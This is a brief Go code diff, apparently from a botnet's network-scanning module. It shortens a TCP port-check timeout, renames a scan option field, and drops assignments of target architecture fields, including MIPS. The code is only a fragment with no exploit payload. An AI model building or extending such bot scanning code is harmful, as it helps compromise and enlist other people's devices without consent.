@@ -209,7 +209,7 @@ func (b *Bot) manageScanRange() string {
 }
 
 func (b *Bot) checkPort(ipAddr, port string) string {
-	b.timeout = 1 * time.Second
+	b.timeout = 500 * time.Millisecond
 	conn, err := net.DialTimeout("tcp", ipAddr+":"+port, b.timeout)
 	if err != nil {
 		return ""
@@ -314,7 +314,7 @@ func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) b
 
 func (b *Bot) Scanner() {
 	if setCall, setKey := SetupCaller(); setKey {
-		if value, key := ScanMap[setCall.CallBot.scanOpt]; key {
+		if value, key := ScanMap[setCall.CallBot.ScanOpt]; key {
 			/*
 				Full core scanning of a bot CPU
 				Create a concurrence following by numbers of core in CPU.
@@ -330,8 +330,6 @@ func (b *Bot) Scanner() {
 				multiCores := "[" + strconv.Itoa(b.CPU) + "] CORES"
 				coreReport = &multiCores
 			}
-			b.defaultArch = setCall.CallBot.defaultArch
-			b.mipsArch = setCall.CallBot.mipsArch
 
 			b.Report(*coreReport + " START SCANNING ON " +
 				value.scanOptFull + " NETWORK...")
